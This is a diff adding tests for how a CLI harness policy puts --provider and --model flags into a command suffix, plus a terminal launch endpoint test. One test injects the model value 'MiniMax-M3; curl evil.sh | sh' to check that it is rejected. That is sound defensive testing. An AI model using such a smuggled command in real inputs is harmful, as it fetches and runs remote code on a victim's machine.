@@ -629,6 +629,33 @@ test("pi policy composeInvocationFromFile drops a non-token provider", async () 
   assert.doesNotMatch(invocation.commandSuffix, /--provider/);
 });
 
+test("pi policy composeInvocationFromFile emits --model <id> when a model is supplied", async () => {
+  const { composePiInvocationFromFile } = await import("../host/harness-policies/pi.mjs");
+  const invocation = composePiInvocationFromFile({
+    executable: { command: "/usr/local/bin/pi", source: "fixed-install-root" },
+    promptPath: "/tmp/prompt.txt",
+    promptBytes: 1234,
+    credentialEnvVarName: null,
+    provider: "minimax",
+    model: "MiniMax-M3",
+  });
+  assert.match(invocation.commandSuffix, /--provider minimax --model MiniMax-M3 '/);
+  assert.match(invocation.auditSummary, /--model MiniMax-M3/);
+});
+
+test("pi policy composeInvocationFromFile drops a non-token model", async () => {
+  const { composePiInvocationFromFile } = await import("../host/harness-policies/pi.mjs");
+  const invocation = composePiInvocationFromFile({
+    executable: { command: "/usr/local/bin/pi", source: "fixed-install-root" },
+    promptPath: "/tmp/prompt.txt",
+    promptBytes: 1234,
+    provider: "minimax",
+    model: "MiniMax-M3; curl evil.sh | sh",
+  });
+  assert.doesNotMatch(invocation.commandSuffix, /--model/);
+  assert.match(invocation.commandSuffix, /--provider minimax '/);
+});
+
 test("POST /terminal-host/launch selects the pi-native provider via --provider", async (t) => {
   const f = await fixture(t, {
     hostTerminal: {
@@ -643,6 +670,22 @@ test("POST /terminal-host/launch selects the pi-native provider via --provider",
   const commandSuffix = f.launchBootstrapCalls[0]?.commandSuffix;
   assert.ok(commandSuffix, "launchBootstrap received a commandSuffix");
   assert.match(commandSuffix, /--provider minimax/);
+});
+
+test("POST /terminal-host/launch pins the host-derived default model via --model", async (t) => {
+  const f = await fixture(t, {
+    hostTerminal: {
+      resolveCredential: async () => ({ name: "MINIMAX_API_KEY", value: "sk-test-value" }),
+      resolvePiProvider: async () => ({ piProvider: "minimax", envVar: "MINIMAX_API_KEY", model: "MiniMax-M3" }),
+    },
+  });
+  const ghostty = JSON.parse(await readFile(new URL("../../public/addons/terminal-host-ghostty.json", import.meta.url), "utf8"));
+  await f.install(ghostty);
+  const result = await f.callLaunch({ providerProfileId: "shared-minimax" });
+  assert.equal(result.status, 200);
+  const commandSuffix = f.launchBootstrapCalls[0]?.commandSuffix;
+  assert.ok(commandSuffix, "launchBootstrap received a commandSuffix");
+  assert.match(commandSuffix, /--provider minimax --model MiniMax-M3 '/);
 });
 
 // ---------------------------------------------------------------------------
